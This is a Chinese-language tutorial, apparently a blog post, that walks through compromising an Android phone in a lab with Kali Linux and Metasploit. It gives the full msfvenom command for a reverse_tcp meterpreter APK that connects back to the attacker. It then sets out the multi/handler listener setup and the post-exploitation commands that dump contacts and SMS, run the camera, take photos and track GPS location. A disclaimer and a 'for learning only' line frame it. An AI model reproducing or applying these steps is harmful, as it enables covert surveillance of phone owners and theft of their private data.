 本文实验旨在简单介绍下使用 kali 渗透测试局域网手机，实验环境均在VMware虚拟机内，并无涉及真实IP地址。若因传播或利用本文所提供的信息而造成任何直接或间接的后果，均由使用者本人负责，作者不为此承担任何责任！

 

测试环境如下：

kali虚拟机：攻击机。
win10中间机：用于将kali生成的远程木马发送到Android手机中。
Android手机：靶机。
Xshell4：用于将在kali上生成的远程木马从kali中导到win10中间机中。

 

下面开始：

打开kali利用msfvenom生成木马文件，payload选择android/meterpreter/reverse_tcp，后接Kali虚拟机IP地址和端口，指令如下：

msfvenom -p android/meterpreter/reverse_tcp LHOST=Kali虚拟机IP地址 LPORT=端口 R > /root/android.apk
（记住上面输入的这个端口，这里暂且标注为端口A，因为最后需要用到这个端口。）

之后可以用 ls 指令查看生成的文件（android.apk）。

后面，利用win10中的Xshell4将kali中生成的android.apk传送到指定路径，让Android靶机安装，如下所示：

下面是设置为kali的名字、kali虚拟机的IP地址和端口：



下面是指定文件（android.apk）的路径：



用 sz 文件名这个指令，将文件传到指定路径，如下所示：

sz android.apk
传送该文件是为了方便靶机安装，传送完成之后，让靶机安装该 android.apk 文件，待目标靶机上安装完成后，在 kali 启动 msfconsole 如下所示（开启并使用 msf 中监听）：

msfconsole
用以下指令加载模块：

use exploit/multi/handler
选择 payload 如下所示：

set payload android/meterpreter/reverse_tcp
最后，分别使用以下指令，即可开始执行漏洞，开启监听等待目标上线：

set LHOST kali虚拟机IP地址
set LPORT 端口A(就是一开始生成android.apk时所填入的端口)
exploit
现在，在目标手机上点一下文件，该文件是没有页面的，但是点一下就已经成功建立攻击会话了，kali提示如下：



成功拿到msf中会建立会话后，执行如下指令查看系统信息：

sysinfo
执行如下指令查看安装app文件：

app_list
执行如下指令检测系统root：

check_root
执行如下指令下载通讯录信息：

dump_contacts
执行如下指令获取摄像头信息：

webcam_list
执行如下指令开启摄像头：

webcam_stream
执行如下指令远程控制对方手机拍摄一张照片：

webcam_snap
用如下指令远程控制对方手机开起视频聊天：

webcam_chat
用如下指令实时查看对方手机的信息：

dump_sms
用如下指令实时获取对方手机GPS定位：

geolocate
本文到这里就结束了。

总结，我的教学仅供大家学习使用，希望可以对kali linux有一些心得，切莫用于违法用途。
